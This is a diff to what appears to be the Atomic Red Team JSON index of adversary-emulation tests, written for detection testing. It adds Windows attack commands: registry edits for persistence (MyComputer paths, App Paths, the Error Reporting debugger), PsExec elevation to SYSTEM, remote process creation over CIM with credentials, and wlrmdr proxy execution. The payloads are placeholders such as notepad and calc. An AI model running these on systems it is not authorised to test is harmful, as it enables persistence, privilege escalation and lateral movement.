@@ -2551,6 +2551,70 @@
 		"phases": ["defense-evasion"]
 	},
 	{
+		"name": "Abusing MyComputer Disk Cleanup Path for Persistence",
+		"auto_generated_guid": "f2915249-4485-42e2-96b7-9bf34328d497",
+		"supported_platforms": ["windows"],
+		"executor": {
+			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
+			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /d \"%SystemRoot%\\System32\\cleanmgr.exe /D %c\" /f\n",
+			"name": "command_prompt",
+			"elevation_required": true
+		},
+		"attack_technique": "T1112",
+		"phases": ["defense-evasion"]
+	},
+	{
+		"name": "Abusing MyComputer Disk Fragmentation Path for Persistence",
+		"auto_generated_guid": "3235aafe-b49d-451b-a1f1-d979fa65ddaf",
+		"supported_platforms": ["windows"],
+		"executor": {
+			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
+			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\dfrgui.exe\" /f\n",
+			"name": "command_prompt",
+			"elevation_required": true
+		},
+		"attack_technique": "T1112",
+		"phases": ["defense-evasion"]
+	},
+	{
+		"name": "Abusing MyComputer Disk Backup Path for Persistence",
+		"auto_generated_guid": "599f3b5c-0323-44ed-bb63-4551623bf675",
+		"supported_platforms": ["windows"],
+		"executor": {
+			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
+			"cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%SystemRoot%\\system32\\sdclt.exe\" /f\n",
+			"name": "command_prompt",
+			"elevation_required": true
+		},
+		"attack_technique": "T1112",
+		"phases": ["defense-evasion"]
+	},
+	{
+		"name": "Adding custom paths for application execution",
+		"auto_generated_guid": "573d15da-c34e-4c59-a7d2-18f20d92dfa3",
+		"supported_platforms": ["windows"],
+		"input_arguments": {
+			"app_name": {
+				"description": "path of application to be modified",
+				"type": "string",
+				"default": "msedge.exe"
+			},
+			"new_path": {
+				"description": "New App Path Added",
+				"type": "string",
+				"default": "C:\\Windows\\System32\\notepad.exe"
+			}
+		},
+		"executor": {
+			"command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /t REG_SZ /d #{new_path} /f\n",
+			"cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /v (Default) /f\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /t REG_SZ /d \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" /f\n",
+			"name": "command_prompt",
+			"elevation_required": true
+		},
+		"attack_technique": "T1112",
+		"phases": ["defense-evasion"]
+	},
+	{
 		"name": "SIP (Subject Interface Package) Hijacking via Custom DLL",
 		"auto_generated_guid": "e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675",
 		"supported_platforms": ["windows"],
@@ -5454,6 +5518,31 @@
 		]
 	},
 	{
+		"name": "Use PsExec to elevate to NT Authority\\SYSTEM account",
+		"auto_generated_guid": "6904235f-0f55-4039-8aed-41c300ff7733",
+		"supported_platforms": ["windows"],
+		"dependency_executor_name": "powershell",
+		"dependencies": [
+			{
+				"description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
+				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0 } else { exit 1 }\n",
+				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
+			}
+		],
+		"executor": {
+			"name": "command_prompt",
+			"elevation_required": true,
+			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami\n"
+		},
+		"attack_technique": "T1078.003",
+		"phases": [
+			"defense-evasion",
+			"initial-access",
+			"persistence",
+			"privilege-escalation"
+		]
+	},
+	{
 		"name": "Windows - Delete Volume Shadow Copies",
 		"auto_generated_guid": "43819286-91a9-4369-90ed-d31fb4da2c01",
 		"supported_platforms": ["windows"],
@@ -7200,6 +7289,19 @@
 			"name": "powershell",
 			"elevation_required": true,
 			"command": "# Set the remote computer name and credentials\n $RemoteComputer = \"#{dest}\"\n $PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \"#{process}\"\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n     Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\"\n } else {\n     Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\"\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession \n"
+		},
+		"attack_technique": "T1546",
+		"phases": ["persistence", "privilege-escalation"]
+	},
+	{
+		"name": "Adding custom debugger for Windows Error Reporting",
+		"auto_generated_guid": "17d1a3cc-3373-495a-857a-e5dd005fb302",
+		"supported_platforms": ["windows"],
+		"executor": {
+			"command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n",
+			"cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /f\n",
+			"name": "command_prompt",
+			"elevation_required": true
 		},
 		"attack_technique": "T1546",
 		"phases": ["persistence", "privilege-escalation"]
@@ -11042,6 +11144,25 @@
 		"phases": ["defense-evasion"]
 	},
 	{
+		"name": "System Binary Proxy Execution - Wlrmdr Lolbin",
+		"auto_generated_guid": "7816c252-b728-4ea6-a683-bd9441ca0b71",
+		"supported_platforms": ["windows"],
+		"input_arguments": {
+			"payload_path": {
+				"description": "Path to the executable",
+				"type": "String",
+				"default": "C:\\Windows\\System32\\calc.exe"
+			}
+		},
+		"executor": {
+			"command": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \"#{payload_path}\"",
+			"name": "powershell",
+			"elevation_required": false
+		},
+		"attack_technique": "T1218",
+		"phases": ["defense-evasion"]
+	},
+	{
 		"name": "Change Default File Association",
 		"auto_generated_guid": "10a08978-2045-4d62-8c42-1957bbbea102",
 		"supported_platforms": ["windows"],
@@ -12477,6 +12598,26 @@
 		"executor": {
 			"command": "sc.exe sdset scmanager D:(A;;KA;;;WD)\n",
 			"name": "command_prompt",
+			"elevation_required": true
+		},
+		"attack_technique": "T1569.002",
+		"phases": ["execution"]
+	},
+	{
+		"name": "Pipe Creation - PsExec Tool Execution From Suspicious Locations",
+		"auto_generated_guid": "004a5d68-627b-452d-af3d-43bd1fc75a3b",
+		"supported_platforms": ["windows"],
+		"dependency_executor_name": "powershell",
+		"dependencies": [
+			{
+				"description": "PsExec tool from Sysinternals must exist in the '\\Users\\Public\\Temp\\' directory\n",
+				"prereq_command": "if (Get-ChildItem -Path C:\\ -Include *psexec* -File -Recurse -ErrorAction SilentlyContinue) {exit 0} else {exit 1}\n",
+				"get_prereq_command": "New-Item -Type Directory \"C:\\Users\\Public\\Temp\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"C:\\Users\\Public\\Temp\\PSTools.zip\"\nExpand-Archive \"C:\\Users\\Public\\Temp\\PsTools.zip\" \"C:\\Users\\Public\\Temp\\\" -Force\n"
+			}
+		],
+		"executor": {
+			"command": "cd C:\\Users\\Public\\Temp\\ \n.\\PsExec.exe -i -s cmd  -accepteula",
+			"name": "powershell",
 			"elevation_required": true
 		},
 		"attack_technique": "T1569.002",
